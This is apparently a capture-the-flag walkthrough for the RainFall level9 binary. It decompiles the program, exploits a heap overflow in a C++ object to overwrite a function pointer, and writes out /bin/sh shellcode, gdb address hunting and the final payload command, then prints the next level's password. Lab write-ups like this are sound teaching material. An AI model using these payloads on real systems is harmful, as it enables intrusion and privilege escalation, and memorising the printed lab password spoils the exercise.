###  Walkthrough

```cpp
// Ghidra
void main(int param_1,int param_2)
{
  N *this;
  code **this_00;

  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N(this,5);
  this_00 = (code **)operator.new(0x6c);
  N((N *)this_00,6);
  setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}
```

```cpp
// Retdec
// Address range: 0x80485f4 - 0x804869a
int main(int argc, char ** argv) {
    if (argc <= 1) {
        // 0x8048604
        _exit(1);
        // UNREACHABLE
    }
    int32_t * v1 = _Znwj(108); // 0x8048617
    _ZN1NC1Ei(v1, 5);
    int32_t * v2 = _Znwj(108); // 0x8048639
    _ZN1NC1Ei(v2, 6);
    _ZN1N13setAnnotationEPc(v1, (char *)*(int32_t *)((int32_t)argv + 4));
    return (int32_t)v2;
}
```

This level was one of the toughest for us...

<u>Here is how we managed to gain privileges :</u>

First, let's try understanding it's execution :

* The program takes one parameter.

* It then checks, according to Retdec and our tests, that argc > 1, otherwise it exits

* It then instantiates 2 objects, this and this00. These instantiations hide malloc instructions that happen in the heap, so their memory adresses may follow in memory.

```cpp
void __thiscall setAnnotation(N *this,char *param_1)
{
  size_t __n;

  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}
```

* If our argv[1] is +108 long, we begin to overflow `this` and start writing at the beginning of `this00`

The next important part before beginning our exploit is : 

```cpp 
  (**(code **)*this_00)(this_00,this);
```

This line is basically a function pointer on the value at the address of this_00.

So, in order to make it work, we first have to find the address of the `this` : 

```bash
level9@RainFall:~$ ltrace ./level9 yo
__libc_start_main(0x80485f4, 2, 0xbffff7a4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)             = 0
_Znwj(108, 0xbffff7a4, 0xbffff7b0, 0xb7d79e55, 0xb7fed280)                        = 0x804a008
_Znwj(108, 5, 0xbffff7b0, 0xb7d79e55, 0xb7fed280)                                 = 0x804a078
strlen("yo")                                                                      = 2
memcpy(0x0804a00c, "yo", 2)                                                       = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)           = 0xb7fce4a0
+++ exited (status 11) +++
```

Here, at this line : `memcpy(0x0804a00c, "yo", 2) = 0x0804a00c`, we see that the dest address of memcpy is `0x0804a00c`. If we check again on the source code, it's the address of the beginning of the data of our `this` object.

Then, we need to see the padding required, and check wether it worked :

```bash
level9@RainFall:~$ ./level9 `python -c 'print(108 * "A" + "BBBB")'`
Segmentation fault (core dumped)
level9@RainFall:~$ dmesg
...
[45298.046277] level9[10396]: segfault at 42424242 ip 08048682 sp bffff670 error 4 in level9[8048000+1000]
```

We find our "BBBB" string, this means that it worked.

After some trials and errors, in order to make it work, we stored our shellcode inside our environnement :

```bash
export SHELLCODE=`python -c 'print("\x90" * 30 + "\x31\xc0\xb0\x0b\xbb\x2f\x2f\x73\x68\xc1\xeb\x08\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\x31\xc9\x31\xd2\xcd\x80")'`
```

We thus need to find it's address :

```bash
$ gdb ./level9
$ b *main
$ r
$ x/100x *environ
0xbffff887:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xbffff897:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff8a7:	0x90909090	0x90909090	0x6850c031	0x68732f2f
0xbffff8b7:	0x69622f68	0x50e3896e	0xb0e18953	0x0080cd0b
0xbffff8c7:	0x4c454853	0x622f3d4c	0x622f6e69	0x00687361
0xbffff8d7:	0x4d524554	0x6574783d	0x322d6d72	0x6f633635
0xbffff8e7:	0x00726f6c	0x5f485353	0x45494c43	0x313d544e
0xbffff8f7:	0x312e3239	0x352e3836	0x20312e36	0x36303336
0xbffff907:	0x32342035	0x53003234	0x545f4853	0x2f3d5954
0xbffff917:	0x2f766564	0x2f737470	0x53550031	0x6c3d5245
0xbffff927:	0x6c657665	0x534c0039	0x4c4f435f	0x3d53524f
0xbffff937:	0x303d7372	0x3d69643a	0x333b3130	0x6e6c3a34
0xbffff947:	0x3b31303d	0x6d3a3633	0x30303d68	0x3d69703a
0xbffff957:	0x333b3034	0x6f733a33	0x3b31303d	0x643a3533
0xbffff967:	0x31303d6f	0x3a35333b	0x343d6462	0x33333b30
0xbffff977:	0x3a31303b	0x343d6463	0x33333b30	0x3a31303b
0xbffff987:	0x343d726f	0x31333b30	0x3a31303b	0x333d7573
0xbffff997:	0x31343b37	0x3d67733a	0x343b3033	0x61633a33
0xbffff9a7:	0x3b30333d	0x743a3134	0x30333d77	0x3a32343b
0xbffff9b7:	0x333d776f	0x32343b34	0x3d74733a	0x343b3733
0xbffff9c7:	0x78653a34	0x3b31303d	0x2a3a3233	0x7261742e
0xbffff9d7:	0x3b31303d	0x2a3a3133	0x7a67742e	0x3b31303d
0xbffff9e7:	0x2a3a3133	0x6a72612e	0x3b31303d	0x2a3a3133
0xbffff9f7:	0x7a61742e	0x3b31303d	0x2a3a3133	0x687a6c2e
0xbffffa07:	0x3b31303d	0x2a3a3133	0x6d7a6c2e	0x31303d61
```

Select the address of one of the line containing our nop instructions : `0xbffff897` for example

We now have all the required infos, let's write our payload :

```bash
$ ./level9 `python -c 'print("\xa7\xf8\xff\xbf" * 2  + 88 * "A" + 4 * "\x0c\xa0\x04\x08")'`
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

```bash
su bonus0
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

